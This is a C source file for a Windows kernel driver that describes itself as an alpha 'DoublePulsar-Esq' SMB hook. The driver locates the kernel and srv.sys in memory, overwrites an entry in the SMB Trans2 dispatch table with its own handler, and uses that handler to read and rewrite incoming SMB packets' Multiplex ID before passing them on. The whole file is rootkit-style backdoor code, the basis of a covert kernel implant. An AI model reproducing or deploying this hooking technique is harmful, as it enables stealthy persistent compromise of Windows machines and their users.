/*!
 *
 * driver.c
 *
 * Kernel Driver entrypoint. DriverEntry is the
 * equivalent of an EXE's "main()" function. Accepts
 * any incoming data.
 *
 * @ authors Mumbai (Austin)
 * @ version 0.1 Alpha
 *
**/
#include <ntifs.h>
#include <ntddk.h>
#include <wdm.h>
#pragma warning(disable : 4113)
#include "keutil.h"

//
//	Windows 7  = Working
//	Windows 10 = BSOD cause of PatchGuard
//
#define OFFSET_DISPATCH_TABLE_WIN7  0x760
#define OFFSET_DISPATCH_TABLE_WIN10 0x1260

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation
} SYSTEM_INFORMATION_CLASS,
* PSYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI* ZwQuerySystemInformation_t)(
	SYSTEM_INFORMATION_CLASS SystemInfoClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);
typedef PVOID(NTAPI* ExAllocatePool_t)(
	POOL_TYPE PoolType,
	SIZE_T NumberOfBytes
);
typedef VOID(NTAPI* ExFreePool_t)(
	PVOID Address
);

typedef NTSTATUS(NTAPI* SrvTransactionNotImplemented_t)(
	VOID* Unknown1
);

//
// Internal functions
//
extern PVOID inline GetRegR8();
VOID DriverUnload(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
NTSTATUS SrvTransactionNotImplemented(PVOID WorkContext);


PVOID *g_TransactionTable = NULL;
PVOID g_TransactionTableEntry = NULL;

//
// DriverEntry():
//  Kernel Driver Entrypoint. Handles any incoming
//  data, and responds accordingly.
//
NTSTATUS DriverEntry(
	PDRIVER_OBJECT DriverObject,
	PUNICODE_STRING RegistryPath
) {

	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = DriverUnload;

	PKPCR KernelKpcr = KeGetKpcr();
	if (KernelKpcr != NULL) {

#if defined(_WIN64)
		PVOID64 IdtEntry = KeGetIDTEntry(KernelKpcr);
		PVOID64 NtosBase = (PVOID64)((ULONG64)IdtEntry & ~0xFFF);
#else
		PVOID IdtEntry = KeGetIDTEntry(KernelKpcr);
		PVOID NtosBase = (PVOID)((ULONG32)IdtEntry & ~0xFFF);
#endif
		while (
			(*(UINT16 *)NtosBase) != IMAGE_DOS_SIGNATURE
		) {
#if defined(_WIN64)
			NtosBase = \
				(PVOID64)(((ULONG64)NtosBase) - PAGE_SIZE); continue;
#else
			NtosBase = \
				(PVOID)(((ULONG32)NtosBase) - PAGE_SIZE); continue;
#endif
		};

		ULONG StructSize = 0;
		
		PVOID ZwQueryFunc = KeGetPeExport64(NtosBase, "ZwQuerySystemInformation");
		PVOID ZwAllocFunc = KeGetPeExport64(NtosBase, "ExAllocatePool");
		PVOID ZwFreeFunc  = KeGetPeExport64(NtosBase, "ExFreePool");

		PCHAR ZwDriverStr = (PCHAR)"srv.sys";

		((ZwQuerySystemInformation_t)ZwQueryFunc)(
			SystemModuleInformation, &StructSize, 0, &StructSize
		);
		PSYSTEM_MODULE_INFORMATION pModuleList = ((ExAllocatePool_t)ZwAllocFunc)(
			PagedPool, StructSize
		);
		((ZwQuerySystemInformation_t)ZwQueryFunc)(
			SystemModuleInformation, pModuleList, StructSize, &StructSize
		);

		PVOID SrvDriverBase     = KeGetDriverBase(pModuleList, ZwDriverStr);
		PVOID SrvDriverDataSec1 = KeGetDriverSection64(SrvDriverBase, ".data");

		PVOID* SrvDispatchTable1 = \
			(PVOID)(((ULONG64)SrvDriverDataSec1) + OFFSET_DISPATCH_TABLE_WIN7);

		g_TransactionTable = SrvDispatchTable1;
		g_TransactionTableEntry = SrvDispatchTable1[14];

		SrvDispatchTable1[14] = (PVOID)SrvTransactionNotImplemented;

		UNREFERENCED_PARAMETER(SrvDriverDataSec1);
		((ExFreePool_t)ZwFreeFunc)(pModuleList);
	};
	return STATUS_SUCCESS;
};

//
// DriverUnload():
//	DriverUnload callback. Unloads the driver.
//
VOID DriverUnload(
	PDRIVER_OBJECT DriverObject,
	PUNICODE_STRING RegistryPath
) {
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	g_TransactionTable[14] = g_TransactionTableEntry;
};

//
// SrvTransactionNotImplemented():
//	DoublePulsar-Esq Hook For Manipulating SMB 
//	responses via MultiPlex ID. Work-InProgress
//
#pragma warning(disable: 4103)
#include "smb.h"
NTSTATUS SrvTransactionNotImplemented(
	PVOID WorkContext
) {
	PVOID SrvTransactionPacket = GetRegR8();
	PSMB_HEADER SmbHeader = (PSMB_HEADER)SrvTransactionPacket;
	
	PSMB_TRANS2_HDR SmbTrans2Header = (PSMB_TRANS2_HDR)(
		((ULONG64)SmbHeader) + FIELD_OFFSET(SMB_HEADER, MID) + 0x2
	);

	DbgPrint("======== Start SMB Packet =======\n");
	DbgPrint("Header %s\n", (PCHAR)(&SmbHeader->Protocol));
	DbgPrint("Subcommand %x\n", SmbHeader->Command);
	DbgPrint("MultiPlex ID %hu\n", SmbHeader->MID);
	DbgPrint("Trans2 Word Count %hhu\n", 
		SmbTrans2Header->WordCount);
	DbgPrint("Trans2 Total Parameter Count %hu\n", 
		SmbTrans2Header->TotalParameterCount);
	DbgPrint("======== End SMB Packet   ========\n");
	DbgPrint("======== MODIFIED PACKET  ========\n");

	SmbHeader->MID = 0x10;
	
	return (((SrvTransactionNotImplemented_t)
		g_TransactionTableEntry)(WorkContext));
}